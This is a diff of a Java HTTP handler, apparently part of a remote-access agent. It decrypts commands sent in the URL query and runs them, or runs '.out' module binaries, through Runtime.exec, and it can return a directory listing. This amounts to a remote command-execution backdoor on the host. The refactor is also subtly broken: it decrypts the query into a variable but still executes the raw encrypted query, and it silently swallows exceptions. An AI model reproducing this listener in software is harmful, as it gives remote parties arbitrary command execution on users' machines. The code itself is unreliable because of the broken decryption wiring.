@@ -35,37 +35,42 @@ public class CommandListener extends Thread implements HttpHandler {
 
     @Override
     public void handle(HttpExchange exchange) throws IOException {
-        URI requestURI = exchange.getRequestURI();
-        String query = requestURI.getQuery();
-        LOGGER.info(requestURI.getAuthority() + " Issued a command");
-        String response = "";
-        if (query.startsWith("!")) {
-            response = executeModule(query);
-        } else if (query.equals("tree")) {
-            response = new FileAssert().printDirectoryTree(new File("."));
-        } else {
-            response = executeCommand(query);
-        }
-        exchange.sendResponseHeaders(200, response.length());
-        OutputStream os = exchange.getResponseBody();
-        os.write(response.getBytes());
-        os.close();
-    }
-
-    public String executeCommand(String q) {
         try {
+            URI requestURI = exchange.getRequestURI();
+            String query = requestURI.getQuery();
+            LOGGER.info(requestURI.getAuthority() + " Issued a command");
+            String response = "";
             AsymmetricCryptography as = new AsymmetricCryptography();
             PrivateKey privateKey = as.getPrivate("KeyPair/privateKey");
-            String cmd = as.decryptText(q, privateKey);
+            String cmd = as.decryptText(query, privateKey);
+            if (cmd.startsWith("!")) {
+                response = executeModule(query);
+            } else if (cmd.equals("tree")) {
+                response = new FileAssert().printDirectoryTree(new File("."));
+            } else {
+                response = executeCommand(query);
+            }
+            exchange.sendResponseHeaders(200, response.length());
+            OutputStream os = exchange.getResponseBody();
+            os.write(response.getBytes());
+            os.close();
+        } catch (Exception e) {
+            // TODO: handle exception
+        }
+    }
+
+    public String executeCommand(String cmd) {
+        try {
+
             Runtime.getRuntime().exec(cmd);
             LOGGER.log(Level.INFO, "Ejecutando comando: " + cmd);
-            return "Command ran successfully";
+            return "Normal runner: Command ran successfully";
         } catch (Exception e) {
             // TODO Auto-generated catch block
             LOGGER.log(Level.SEVERE, e.toString());
         }
 
-        return "Command failed";
+        return "Normal runner: Command failed";
     }
 
     public String executeModule(String q) {
@@ -78,12 +83,12 @@ public class CommandListener extends Thread implements HttpHandler {
                 rute = rute + ".out";
                 Runtime.getRuntime().exec(rute);
             }
-            return "Command ran successfully";
+            return "Module runner: Command ran successfully";
         } catch (Exception e) {
-            //TODO: handle exception
+            // TODO: handle exception
             LOGGER.log(Level.SEVERE, e.toString());
         }
-        
-        return "Command failed";
+
+        return "Module runner: Command failed";
     }
 }
